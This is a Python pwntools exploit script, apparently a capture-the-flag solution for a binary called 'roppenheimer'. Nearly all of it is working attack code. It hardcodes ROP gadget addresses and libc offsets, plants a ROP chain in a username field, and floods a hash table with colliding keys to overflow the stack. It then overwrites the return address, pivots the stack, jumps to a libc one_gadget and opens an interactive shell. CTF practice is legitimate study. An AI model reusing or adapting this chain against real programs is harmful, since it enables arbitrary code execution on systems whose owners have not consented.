#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template roppenheimer
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('roppenheimer')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())
#####################

#Useful gadgets

pop_rax_rsp_rdi_rbp_ret = 0x004025de

buffer = 0x0040a520

rdx_offset_to_libc = 0x5FB370+0x28000

mov_rax_rdx_pop_rbp = 0x000402eb1 

sub_rax_prbp_0x8_pop_rbp= 0x0000000000403e9f

one_gadjet = 0xebcf8

jmp_rax = 0x000000040254c

rbp = buffer+0x8

pop_rdx_pop_rbx = 0x0000000000090529

max_val = 0xffffffffffffffff+1
############################
#Functions
def add_atom(key,value):
    io.sendlineafter(b'> ',str(1).encode())
    io.sendlineafter(b'> ',str(key).encode())
    io.sendlineafter(b'> ',str(value).encode())
    return
def trigger(key):
    io.sendlineafter(b'> ',str(2).encode())
    io.sendlineafter(b'> ',str(key).encode())
    return
###############################
#Values to jump into libc
rop_chain = p64(rdx_offset_to_libc-pop_rdx_pop_rbx) #there is an pointer to vtable in libstdc++ in rdx and we can jump in libc by using offset to it 
rop_chain+=p64(max_val-one_gadjet+pop_rdx_pop_rbx) 
#Rop chain start
rop_chain+=p64(buffer) #rdi
rop_chain+=p64(rbp) #buffer +0x8
rop_chain+=p64(mov_rax_rdx_pop_rbp) #ret
rop_chain+=p64(rbp) #buffer +0x8
rop_chain+=p64(sub_rax_prbp_0x8_pop_rbp) # sub rax dword[rbp-0x8](buffer)
rop_chain+=p64(rbp+0x8) #buffer+0x10
rop_chain+=p64(jmp_rax) #jump rax(pop rdx pop rbx ret) #prepare rdx to pop shell
rop_chain+=p64(0) #rdx
rop_chain+=p64(0) #rbx
rop_chain+=p64(sub_rax_prbp_0x8_pop_rbp) #sub rax dword[rbp-0x8](buffer+0x8)
rop_chain+=p64(rbp+0x70)
rop_chain+=p64(jmp_rax)#jmp rax(one_gadget)
#############
io = start()

io.sendlineafter(b'>',rop_chain) #we put our rop chain into username field

for i in range(1,28): #fill the bucket and trigger collisions
    add_atom(59*i,0x5)
add_atom(59*28,pop_rax_rsp_rdi_rbp_ret) # return address
add_atom(59*29,buffer+0x10) # values buffer get into rsp
for i in range(30,33): #stack overflow trigger
    add_atom(59*i,0x5)
#run rop chain
trigger(59)

io.interactive()
